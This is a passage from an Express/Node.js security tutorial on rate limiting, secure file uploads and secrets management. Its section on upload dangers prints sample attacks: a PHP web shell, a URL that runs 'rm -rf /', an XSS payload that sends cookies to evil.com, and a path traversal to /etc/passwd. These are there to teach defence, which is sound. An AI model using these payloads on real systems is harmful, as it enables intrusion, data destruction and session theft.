        message: "API rate limit exceeded. Please slow down."
      }),

      // Search: 30 requests per minute
      search: this.createLimiter({
        windowMs: 60 * 1000,
        max: 30,
        prefix: "search",
        message: "Search rate limit exceeded. Please wait a moment."
      }),

      // Public: 60 requests per minute
      public: this.createLimiter({
        windowMs: 60 * 1000,
        max: 60,
        prefix: "public",
        message: "Too many requests. Please try again later."
      }),

      // File upload: 10 uploads per hour
      upload: this.createLimiter({
        windowMs: 60 * 60 * 1000,
        max: 10,
        prefix: "upload",
        message: "Upload limit exceeded. Try again in an hour.",
        skipSuccessfulRequests: true
      }),

      // Admin: Higher limits
      admin: this.createLimiter({
        windowMs: 60 * 1000,
        max: 1000,
        prefix: "admin",
        message: "Admin rate limit exceeded",
        skip: (req) => req.user?.role !== "admin" // Only apply to admins
      })
    };
  }
}

// ========== USAGE ==========
const rateLimiter = new RateLimiterService();

// Apply to routes
app.use("/api", rateLimiter.limiters.api);
app.use("/api/login", rateLimiter.limiters.auth);
app.use("/api/signup", rateLimiter.limiters.auth);
app.use("/api/search", rateLimiter.limiters.search);
app.use("/api/upload", rateLimiter.limiters.upload);
app.use("/api/admin", rateLimiter.limiters.admin);
```

### 9.4. Rate Limit Headers

**With standardHeaders: true**:
```http
HTTP/1.1 200 OK
RateLimit-Limit: 100
RateLimit-Remaining: 99
RateLimit-Reset: 1699564800
```

**With legacyHeaders: true**:
```http
HTTP/1.1 200 OK
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 99
X-RateLimit-Reset: 1699564800
```

**Client can read headers and slow down**:
```js
async function makeRequest() {
  const response = await fetch("/api/data");
  
  const remaining = response.headers.get("RateLimit-Remaining");
  const reset = response.headers.get("RateLimit-Reset");
  
  if (remaining < 10) {
    const waitTime = (reset * 1000) - Date.now();
    await delay(waitTime);
  }
}
```

### 9.5.Rate Limiting Best Practices

**1. Layer your rate limits**:
```js
// Global limit
app.use(rateLimit({
  windowMs: 60 * 1000,
  max: 1000,
  message: "Global rate limit exceeded"
}));

// Endpoint-specific limits
app.use("/api/login", authLimiter);
app.use("/api", apiLimiter);
```

**2. Different limits for different HTTP methods**:
```js
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: (req) => {
    if (req.method === "GET") return 100;
    if (req.method === "POST") return 50;
    if (req.method === "DELETE") return 20;
    return 30;
  }
});
```

**3. Skip successful authentication attempts**:
```js
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  skipSuccessfulRequests: true, // Don't count 200 OK responses
  keyGenerator: (req) => req.body.email // Limit per email
});
```

**4. Return meaningful error responses**:
```js
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  handler: (req, res) => {
    res.status(429).json({
      error: "Rate limit exceeded",
      code: "RATE_LIMIT",
      retryAfter: Math.ceil(req.rateLimit.resetTime / 1000),
      limit: req.rateLimit.limit,
      remaining: req.rateLimit.remaining
    });
  }
});
```

**5. Monitor rate limit violations**:
```js
const limiter = rateLimit({
  // ... config
  handler: (req, res, next, options) => {
    // Log to monitoring system
    logger.warn("Rate limit exceeded", {
      ip: req.ip,
      path: req.path,
      userId: req.user?.id,
      method: req.method,
      userAgent: req.headers["user-agent"]
    });
    
    // Send alert if threshold reached
    if (req.rateLimit.current > req.rateLimit.limit * 2) {
      alertService.send("DDoS attack detected", { req });
    }
    
    res.status(429).json({ error: options.message });
  }
});
```

---

## 10. File Upload Security

### 10.1. The Dangers of File Uploads

**Attackers can upload**:

**1. Web shells**:
```php
<?php system($_GET['cmd']); ?>
```
Access: `https://yoursite.com/uploads/shell.php?cmd=rm%20-rf%20/`

**2. Malware**:
- Viruses that infect your users
- Ransomware that encrypts your server
- Botnet clients

**3. Phishing pages**:
- Fake login pages that steal credentials
- Hosted on your trusted domain

**4. Resource exhaustion**:
- 1GB files filling your disk
- Thousands of tiny files exhausting inodes
- Zip bombs that expand to petabytes

**5. Cross-site scripting**:
```html
<img src="x" onerror="document.location='https://evil.com/steal?cookie='+document.cookie">
```

**6. Path traversal**:
```js
filename: "../../../etc/passwd"
// Attempts to write outside uploads directory
```

### 10.2.Secure File Upload Implementation

**1. Validate file type (multiple layers)**:

```js
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
const mime = require("mime-types");
const fileType = require("file-type");

class FileUploadService {
  constructor() {
    this.allowedTypes = {
      image: ["jpg", "jpeg", "png", "gif", "webp"],
      document: ["pdf", "doc", "docx", "txt"],
      archive: ["zip", "tar", "gz"],
      maxSize: 10 * 1024 * 1024, // 10MB
      maxFiles: 10
    };

    this.mimeTypes = {
      jpg: "image/jpeg",
      jpeg: "image/jpeg",
      png: "image/png",
      gif: "image/gif",
      pdf: "application/pdf",
      doc: "application/msword",
      docx: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      txt: "text/plain",
      zip: "application/zip"
    };
  }

  // Layer 1: Extension check (fast, first pass)
  validateExtension(filename) {
    const ext = path.extname(filename).toLowerCase().slice(1);
    const allowed = Object.values(this.allowedTypes).flat();
    
    if (!allowed.includes(ext)) {
      throw new Error(`File extension .${ext} is not allowed`);
    }
    
    return ext;
  }

  // Layer 2: MIME type from extension
  validateMimeType(ext) {
    const expectedMime = this.mimeTypes[ext];
    if (!expectedMime) {
      throw new Error(`Unknown MIME type for .${ext}`);
    }
    return expectedMime;
  }

  // Layer 3: Actual file signature (magic bytes)
  async validateFileSignature(buffer) {
    const type = await fileType.fromBuffer(buffer);
    
    if (!type) {
      throw new Error("Unable to determine file type");
    }
    
    const expectedExt = path.extname(this.originalname).toLowerCase().slice(1);
    
    if (type.ext !== expectedExt && type.mime !== this.mimeTypes[expectedExt]) {
      throw new Error(`File signature mismatch: expected ${expectedExt}, got ${type.ext}`);
    }
    
    return type;
  }

  // Layer 4: Content validation for specific types
  async validateContent(file, type) {
    switch (type.ext) {
      case "jpg":
      case "jpeg":
      case "png":
      case "gif":
      case "webp":
        return this.validateImage(file);
      case "pdf":
        return this.validatePDF(file);
      case "zip":
        return this.validateZip(file);
      default:
        return true;
    }
  }

  async validateImage(file) {
    // Check for image dimensions, malware, etc.
    const sharp = require("sharp");
    
    try {
      const metadata = await sharp(file.buffer).metadata();
      
      // Reject oversized images
      if (metadata.width > 5000 || metadata.height > 5000) {
        throw new Error("Image dimensions too large");
      }
      
      // Reject animated GIFs if not allowed
      if (metadata.pages && metadata.pages > 1) {
        throw new Error("Animated GIFs not allowed");
      }
      
      // Optional: Strip metadata (EXIF)
      const cleanBuffer = await sharp(file.buffer)
        .rotate() // Auto-orient
        .toBuffer();
      
      file.buffer = cleanBuffer;
      
      return true;
    } catch (error) {
      throw new Error(`Invalid image: ${error.message}`);
    }
  }

  async validatePDF(file) {
    // Check for JavaScript in PDF, malware, etc.
    const pdfParse = require("pdf-parse");
    
    try {
      const data = await pdfParse(file.buffer);
      
      // Reject PDFs with embedded JavaScript
      if (data.info?.JavaScript || data.info?.JS) {
        throw new Error("PDF contains JavaScript");
      }
      
      // Reject oversized content
      if (data.text.length > 1000000) {
        throw new Error("PDF text content too large");
      }
      
      return true;
    } catch (error) {
      throw new Error(`Invalid PDF: ${error.message}`);
    }
  }

  async validateZip(file) {
    // Check for zip bombs, path traversal
    const yauzl = require("yauzl");
    const { promisify } = require("util");
    
    return new Promise((resolve, reject) => {
      yauzl.fromBuffer(file.buffer, { lazyEntries: true }, (err, zipfile) => {
        if (err) return reject(new Error("Invalid zip file"));
        
        let totalSize = 0;
        let fileCount = 0;
        
        zipfile.readEntry();
        zipfile.on("entry", (entry) => {
          // Check for path traversal
          if (entry.fileName.includes("..") || path.isAbsolute(entry.fileName)) {
            return reject(new Error("Zip contains path traversal"));
          }
          
          totalSize += entry.uncompressedSize;
          fileCount++;
          
          // Reject zip bombs (compression ratio > 100:1)
          if (entry.compressedSize > 0) {
            const ratio = entry.uncompressedSize / entry.compressedSize;
            if (ratio > 100) {
              return reject(new Error("Zip bomb detected"));
            }
          }
          
          zipfile.readEntry();
        });
        
        zipfile.on("end", () => {
          if (totalSize > 100 * 1024 * 1024) { // 100MB uncompressed
            return reject(new Error("Zip contents too large"));
          }
          
          if (fileCount > 1000) {
            return reject(new Error("Too many files in zip"));
          }
          
          resolve(true);
        });
      });
    });
  }

  // Secure filename generation
  generateSecureFilename(originalname, ext) {
    // Never use user-provided filename
    const timestamp = Date.now();
    const random = crypto.randomBytes(16).toString("hex");
    const hash = crypto
      .createHash("sha256")
      .update(`${timestamp}${random}${originalname}`)
      .digest("hex")
      .slice(0, 16);
    
    return `${timestamp}-${hash}${ext ? `.${ext}` : ""}`;
  }

  // Main upload handler
  async handleUpload(file, category = "general") {
    try {
      // 1. Check file exists
      if (!file) {
        throw new Error("No file uploaded");
      }

      // 2. Check file size
      if (file.size > this.allowedTypes.maxSize) {
        throw new Error(`File too large (max ${this.allowedTypes.maxSize / 1024 / 1024}MB)`);
      }

      // 3. Validate extension
      const ext = this.validateExtension(file.originalname);

      // 4. Validate MIME type
      const expectedMime = this.validateMimeType(ext);

      // 5. Validate file signature
      const fileType = await this.validateFileSignature(file.buffer);

      // 6. Validate content
      await this.validateContent(file, fileType);

      // 7. Generate secure filename
      const secureFilename = this.generateSecureFilename(file.originalname, ext);

      // 8. Determine storage path
      const date = new Date();
      const year = date.getFullYear();
      const month = String(date.getMonth() + 1).padStart(2, "0");
      const day = String(date.getDate()).padStart(2, "0");
      
      const uploadPath = path.join(
        __dirname,
        "../../uploads",
        category,
        `${year}-${month}-${day}`
      );

      // 9. Ensure directory exists
      await fs.promises.mkdir(uploadPath, { recursive: true });

      // 10. Save file
      const filePath = path.join(uploadPath, secureFilename);
      await fs.promises.writeFile(filePath, file.buffer);

      // 11. Return safe file info
      return {
        filename: secureFilename,
        originalName: file.originalname,
        size: file.size,
        mimeType: file.mimetype,
        path: path.relative(path.join(__dirname, "../.."), filePath),
        url: `/uploads/${category}/${year}-${month}-${day}/${secureFilename}`,
        uploadedAt: new Date().toISOString()
      };

    } catch (error) {
      throw new Error(`Upload failed: ${error.message}`);
    }
  }
}

// ========== MULTER CONFIGURATION ==========
const uploadService = new FileUploadService();

const storage = multer.memoryStorage(); // Store in memory for validation

const fileFilter = (req, file, cb) => {
  try {
    // Quick extension check
    uploadService.validateExtension(file.originalname);
    
    // Quick MIME check
    const expectedMime = uploadService.mimeTypes[
      path.extname(file.originalname).toLowerCase().slice(1)
    ];
    
    if (file.mimetype !== expectedMime) {
      return cb(new Error(`MIME type mismatch: expected ${expectedMime}, got ${file.mimetype}`));
    }
    
    cb(null, true);
  } catch (error) {
    cb(error);
  }
};

const upload = multer({
  storage: storage,
  limits: {
    fileSize: 10 * 1024 * 1024, // 10MB
    files: 5 // Max 5 files per request
  },
  fileFilter: fileFilter
});

// ========== ROUTES ==========
app.post("/api/upload/image",
  authenticate,
  rateLimiter.limiters.upload,
  upload.single("image"),
  async (req, res) => {
    try {
      const result = await uploadService.handleUpload(req.file, "images");
      
      // Save to database
      await File.create({
        userId: req.user.id,
        ...result
      });
      
      res.json({
        success: true,
        file: {
          url: result.url,
          filename: result.filename,
          size: result.size
        }
      });
      
    } catch (error) {
      res.status(400).json({
        success: false,
        error: error.message
      });
    }
  }
);

app.post("/api/upload/documents",
  authenticate,
  rateLimiter.limiters.upload,
  upload.array("documents", 5),
  async (req, res) => {
    try {
      const results = [];
      
      for (const file of req.files) {
        const result = await uploadService.handleUpload(file, "documents");
        results.push(result);
      }
      
      // Save to database
      await File.insertMany(
        results.map(r => ({ userId: req.user.id, ...r }))
      );
      
      res.json({
        success: true,
        files: results.map(r => ({
          url: r.url,
          filename: r.filename,
          size: r.size
        }))
      });
      
    } catch (error) {
      res.status(400).json({
        success: false,
        error: error.message
      });
    }
  }
);
```

### 10.3. Serving Uploaded Files Securely

```js
const path = require("path");
const fs = require("fs");
const mime = require("mime-types");

// ========== SECURE FILE SERVING ==========
app.get("/uploads/:category/:date/:filename",
  authenticate, // Require authentication
  async (req, res) => {
    try {
      const { category, date, filename } = req.params;
      
      // 1. Validate path parameters
      if (!["images", "documents", "archives"].includes(category)) {
        return res.status(400).json({ error: "Invalid category" });
      }
      
      if (!/^\d{4}-\d{2}-\d{2}$/.test(date)) {
        return res.status(400).json({ error: "Invalid date format" });
      }
      
      if (!/^\d+-[a-f0-9]+\.[a-z]+$/.test(filename)) {
        return res.status(400).json({ error: "Invalid filename" });
      }

      // 2. Check permissions
      const file = await File.findOne({
        url: req.path,
        userId: req.user.id // Users can only access their own files
      });
      
      if (!file) {
        return res.status(404).json({ error: "File not found" });
      }

      // 3. Construct safe path
      const filePath = path.join(
        __dirname,
        "../../uploads",
        category,
        date,
        filename
      );

      // 4. Prevent path traversal
      const resolvedPath = path.resolve(filePath);
      const uploadsDir = path.resolve(__dirname, "../../uploads");
      
      if (!resolvedPath.startsWith(uploadsDir)) {
        return res.status(403).json({ error: "Access denied" });
      }

      // 5. Check if file exists
      if (!fs.existsSync(resolvedPath)) {
        return res.status(404).json({ error: "File not found" });
      }

      // 6. Set security headers
      res.setHeader("Content-Security-Policy", "default-src 'none'");
      res.setHeader("X-Content-Type-Options", "nosniff");
      res.setHeader("Content-Disposition", "inline");
      
      // 7. Set correct MIME type
      const mimeType = mime.lookup(filePath) || "application/octet-stream";
      res.setHeader("Content-Type", mimeType);

      // 8. Stream file
      res.sendFile(resolvedPath);

    } catch (error) {
      res.status(500).json({ error: "Failed to serve file" });
    }
  }
);

// ========== SECURE FILE DOWNLOAD ==========
app.get("/api/download/:fileId",
  authenticate,
  async (req, res) => {
    try {
      const file = await File.findOne({
        _id: req.params.fileId,
        userId: req.user.id
      });
      
      if (!file) {
        return res.status(404).json({ error: "File not found" });
      }

      const filePath = path.join(__dirname, "../..", file.path);
      
      // Force download with original filename
      res.setHeader("Content-Disposition", `attachment; filename="${encodeURIComponent(file.originalName)}"`);
      res.setHeader("Content-Type", "application/octet-stream");
      res.setHeader("X-Content-Type-Options", "nosniff");
      
      res.sendFile(filePath);
      
    } catch (error) {
      res.status(500).json({ error: "Download failed" });
    }
  }
);
```

### 10.4. File Upload Security Checklist

- Validate file extension against allowlist
- Validate MIME type matches extension
- Validate file signature (magic bytes) - don't trust user-provided MIME
- Scan files for malware/viruses
- Reject executable files (.exe, .php, .js, .sh)
- Set maximum file size limit
- Generate random filenames, never trust user input
- Store files outside webroot
- Serve files through authenticated endpoints
- Set security headers when serving files
- Scan archives for bombs and traversal
- Strip metadata from images (EXIF)
- Validate image dimensions
- Implement rate limiting on upload endpoints
- Log all uploads and access attempts
- Regular cleanup of unused files
- Virus scan integration for high-risk environments

---

## 11. Environment Variables and Secrets Management

### 11.1. Why Environment Variables Are Critical

**Hardcoded secrets are the #1 cause of data breaches**:

```js
// ❌ NEVER DO THIS - COMMITTED TO GIT FOREVER
const jwtSecret = "mysecret123";
const dbPassword = "password123";
const apiKey = "sk_live_abcdefghijklmnop";
```

**Once committed to Git**:
```
1. You push code to GitHub
2. Everyone can see your secrets
3. Automated bots scrape GitHub for API keys
4. Attackers drain your AWS account ($50,000/hour)
5. Your database is compromised
6. Your users' data is stolen

You cannot delete secrets from Git history
```

**Always use environment variables**:
```js
// ✅ CORRECT
const jwtSecret = process.env.JWT_SECRET;
const dbPassword = process.env.DB_PASSWORD;
const apiKey = process.env.STRIPE_SECRET_KEY;
```

---

### 11.2. Environment Variables Setup

**.env file (NEVER commit this)**:
```bash
# .env - Add to .gitignore immediately!
# Copy .env.example to .env for local development

# ====== APP ======
NODE_ENV=production
PORT=3000
APP_URL=https://myapp.com
API_URL=https://api.myapp.com
CLIENT_URL=https://myapp.com

# ====== DATABASE ======
DB_HOST=localhost
DB_PORT=5432
DB_NAME=myapp_prod
DB_USER=myapp_user
DB_PASSWORD=Jx8kLm9pQr2vYt5w  # 20+ chars, mixed case, numbers, special

# ====== REDIS ======
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_PASSWORD=nV4rT7yWq2cX9mL3

# ====== JWT ======
JWT_SECRET=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
JWT_REFRESH_SECRET=f6e5d4c3b2a1f6e5d4c3b2a1f6e5d4c3b2a1f6e5d4c3b2a1f6e5d4c3b2a1

# ====== API KEYS ======
STRIPE_PUBLIC_KEY=PUBLIC_KEY
STRIPE_SECRET_KEY=API_KEY
AWS_ACCESS_KEY_ID=ACCESS_KEY
AWS_SECRET_ACCESS_KEY=SECRTE_TOKEN
SENDGRID_API_KEY=API_KEY

# ====== ENCRYPTION ======
ENCRYPTION_KEY=32-byte-hex-string-for-aes-256-encryption
ENCRYPTION_IV=16-byte-hex-string-for-aes-initialization

# ====== SECURITY ======
CORS_ORIGIN=https://myapp.com,https://www.myapp.com
RATE_LIMIT_WINDOW=900000
RATE_LIMIT_MAX=100
SESSION_SECRET=secure-session-secret-min-32-chars-random
```

**.env.example (commit this)**:
```bash
# .env.example - Template for developers
# Copy to .env and fill in your values

NODE_ENV=development
PORT=3000
APP_URL=http://localhost:3000
API_URL=http://localhost:3000
CLIENT_URL=http://localhost:5173

DB_HOST=localhost
DB_PORT=5432
DB_NAME=myapp_dev
DB_USER=postgres
DB_PASSWORD=

JWT_SECRET=your-32-character-min-secret-here
JWT_REFRESH_SECRET=another-32-character-min-secret

STRIPE_PUBLIC_KEY=
STRIPE_SECRET_KEY=
```

**.gitignore**:
```
# Environment variables
.env
.env.local
.env.production
.env.staging
.env.test

# Never commit these!
*.pem
*.key
*.crt
secrets.json
credentials.json
service-account.json
```

### 11.3. Environment Variable Validation

**Crash early, crash loudly**:

```js
// config/env.js
require("dotenv").config();

class EnvironmentError extends Error {
  constructor(message) {
    super(message);
    this.name = "EnvironmentError";
  }
}

const required = {
  // App
  NODE_ENV: (val) => {
    const valid = ["development", "test", "staging", "production"];
    if (!valid.includes(val)) {
      throw new EnvironmentError(`NODE_ENV must be one of: ${valid.join(", ")}`);
    }
    return val;
  },
  PORT: (val) => {
    const port = parseInt(val, 10);
    if (isNaN(port) || port < 1 || port > 65535) {
      throw new EnvironmentError("PORT must be a valid port number (1-65535)");
    }
    return port;
  },

  // Database
  DB_HOST: (val) => {
    if (!val) throw new EnvironmentError("DB_HOST is required");
    return val;
  },
  DB_PORT: (val) => {
    const port = parseInt(val, 10);
    if (isNaN(port) || port < 1 || port > 65535) {
      throw new EnvironmentError("DB_PORT must be a valid port number");
    }
    return port;
  },
  DB_NAME: (val) => {
    if (!val) throw new EnvironmentError("DB_NAME is required");
    return val;
  },
  DB_USER: (val) => {
    if (!val) throw new EnvironmentError("DB_USER is required");
    return val;
  },
  DB_PASSWORD: (val) => {
    if (process.env.NODE_ENV === "production" && !val) {
      throw new EnvironmentError("DB_PASSWORD is required in production");
    }
    return val;
  },

  // JWT
  JWT_SECRET: (val) => {
    if (!val) throw new EnvironmentError("JWT_SECRET is required");
    if (val.length < 32) {
      throw new EnvironmentError("JWT_SECRET must be at least 32 characters");
    }
    if (process.env.NODE_ENV === "production" && val.length < 64) {
      console.warn("Warning: JWT_SECRET should be at least 64 characters in production");
    }
    return val;
  },
  JWT_REFRESH_SECRET: (val) => {
    if (!val) throw new EnvironmentError("JWT_REFRESH_SECRET is required");
    if (val.length < 32) {
      throw new EnvironmentError("JWT_REFRESH_SECRET must be at least 32 characters");
    }
    return val;
  },

  // API Keys
  STRIPE_SECRET_KEY: (val) => {
    if (process.env.NODE_ENV === "production" && !val) {
      throw new EnvironmentError("STRIPE_SECRET_KEY is required in production");
    }
    if (val && !val.startsWith("sk_live_") && !val.startsWith("sk_test_")) {
      throw new EnvironmentError("STRIPE_SECRET_KEY must start with sk_live_ or sk_test_");
    }
    return val;
  }
};

const optional = {
  APP_URL: (val) => val || `http://localhost:${process.env.PORT || 3000}`,
  API_URL: (val) => val || process.env.APP_URL,
  CLIENT_URL: (val) => {
    if (!val) return "http://localhost:5173";
    return val.split(",");
  },
  REDIS_HOST: (val) => val || "localhost",
  REDIS_PORT: (val) => parseInt(val, 10) || 6379,
  REDIS_PASSWORD: (val) => val || null,
  RATE_LIMIT_WINDOW: (val) => parseInt(val, 10) || 900000,
  RATE_LIMIT_MAX: (val) => parseInt(val, 10) || 100
};

// Validate all required variables
const config = {};

Object.keys(required).forEach(key => {
  try {
    config[key] = required[key](process.env[key]);
  } catch (error) {
    console.error(`❌ Environment validation failed: ${error.message}`);
    process.exit(1);
  }
});

// Load optional variables with defaults
Object.keys(optional).forEach(key => {
  config[key] = optional[key](process.env[key]);
});

// Parse comma-separated lists
if (process.env.CORS_ORIGIN) {
  config.CORS_ORIGIN = process.env.CORS_ORIGIN.split(",").map(s => s.trim());
}

// Freeze config to prevent modifications
Object.freeze(config);

module.exports = config;
```

### 11.4. Secrets Management in Production

**1. Never store secrets in code**:
```js
// ❌ WRONG
const awsConfig = {
  accessKeyId: "AKIAIOSFODNN7EXAMPLE",
  secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
};

// ✅ CORRECT
const awsConfig = {
  accessKeyId: process.env.AWS_ACCESS_KEY_ID,
  secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY
};
```

**2. Use secret management services**:

**AWS Secrets Manager**:
```js
const AWS = require("aws-sdk");
const secretsManager = new AWS.SecretsManager({ region: "us-east-1" });

async function getDatabaseCredentials() {
  try {
    const data = await secretsManager.getSecretValue({
      SecretId: "prod/myapp/database"
    }).promise();
    
    if (data.SecretString) {
      return JSON.parse(data.SecretString);
    }
    
    // Binary secret
    const buff = Buffer.from(data.SecretBinary, "base64");
    return JSON.parse(buff.toString("ascii"));
  } catch (error) {
    console.error("Failed to retrieve secret:", error);
    throw error;
  }
}

// Cache secrets with expiration
let cachedSecrets = null;
let secretsExpiry = null;

async function getSecrets() {
  if (cachedSecrets && secretsExpiry > Date.now()) {
    return cachedSecrets;
  }
  
  const secrets = await getDatabaseCredentials();
  cachedSecrets = secrets;
  secretsExpiry = Date.now() + 15 * 60 * 1000; // 15 minutes
  
  return secrets;
}
```

**HashiCorp Vault**:
```js
const vault = require("node-vault")({
  apiVersion: "v1",
  endpoint: process.env.VAULT_ADDR,
  token: process.env.VAULT_TOKEN
});

async function getDatabaseCredentials() {
  const result = await vault.read("secret/data/myapp/database");
  return result.data.data;
}
```

**3. Environment-specific configurations**:

```js
// config/index.js
const env = process.env.NODE_ENV || "development";

const configs = {
  development: {
    database: {
      host: "localhost",
      port: 5432,
      name: "myapp_dev",
      user: "postgres",
      password: "postgres"
    },
    redis: {
      host: "localhost",
      port: 6379
    },
    logging: true,
    debug: true
  },
  
  test: {
    database: {
      host: "localhost",
      port: 5432,
      name: "myapp_test",
      user: "postgres",
      password: "postgres"
    },
    redis: {
      host: "localhost",
      port: 6379
    },
    logging: false,
    debug: false
  },
  
  staging: {
    database: {
      host: process.env.DB_HOST,
      port: process.env.DB_PORT,
      name: process.env.DB_NAME,
      user: process.env.DB_USER,
      password: process.env.DB_PASSWORD
    },
    redis: {
      host: process.env.REDIS_HOST,
      port: process.env.REDIS_PORT,
      password: process.env.REDIS_PASSWORD
    },
    logging: true,
    debug: true
  },
  
  production: {
    database: {
      host: process.env.DB_HOST,
      port: process.env.DB_PORT,
      name: process.env.DB_NAME,
      user: process.env.DB_USER,
      password: process.env.DB_PASSWORD
    },
    redis: {
      host: process.env.REDIS_HOST,
      port: process.env.REDIS_PORT,
      password: process.env.REDIS_PASSWORD
    },
    logging: false,
    debug: false
  }
};

const config = configs[env];

if (!config) {
  throw new Error(`Unknown environment: ${env}`);
}

module.exports = config;
```

### 11.5. Generating Strong Secrets

**1. Generate JWT secrets**:
```bash
# Generate 64-character random hex string
node -e "console.log(crypto.randomBytes(32).toString('hex'))"
# a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2

# Generate 128-character random base64
node -e "console.log(crypto.randomBytes(64).toString('base64'))"
# Kx9mPq2rTv8wYz5nB3vX7cL9kR1fH4jM6sA2dG5eJ8wN1pQ3rT6yU7iK9oL2pM4
```

**2. Generate database passwords**:
```bash
# 20-character alphanumeric + special
node -e "console.log(crypto.randomBytes(15).toString('base64').replace(/\+/g, '-').replace(/\//g, '_'))"
# Jx8kLm9pQr2vYt5wXz3c
```

**3. Generate encryption keys**:
```js
// AES-256 requires 32-byte key
const encryptionKey = crypto.randomBytes(32).toString("hex");
// 6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2

// Initialization vector (16 bytes)
const iv = crypto.randomBytes(16).toString("hex");
// f6e5d4c3b2a1f6e5d4c3b2a1f6e5d4c3
```

**4. One-liner for .env file**:
```bash
echo "JWT_SECRET=$(node -e "console.log(crypto.randomBytes(32).toString('hex'))")" >> .env
echo "JWT_REFRESH_SECRET=$(node -e "console.log(crypto.randomBytes(32).toString('hex'))")" >> .env
```

---

## Conclusion: Security Is a Process

**Security is not a one-time implementation. It's a continuous process of:**

1. **Threat modeling**: Understanding how your application can be attacked
2. **Defense in depth**: Multiple layers of security (no single point of failure)
3. **Least privilege**: Give users and services only the permissions they need
4. **Secure defaults**: Safe by default, dangerous features opt-in
5. **Fail securely**: Errors should default to denied access
6. **Keep it simple**: Complexity is the enemy of security
7. **Never trust user input**: Validate, sanitize, escape, parameterize
8. **Stay updated**: Patch dependencies, follow security advisories
9. **Log everything**: You can't investigate what you didn't record
10. **Plan for incident**: Have a response plan before you need it
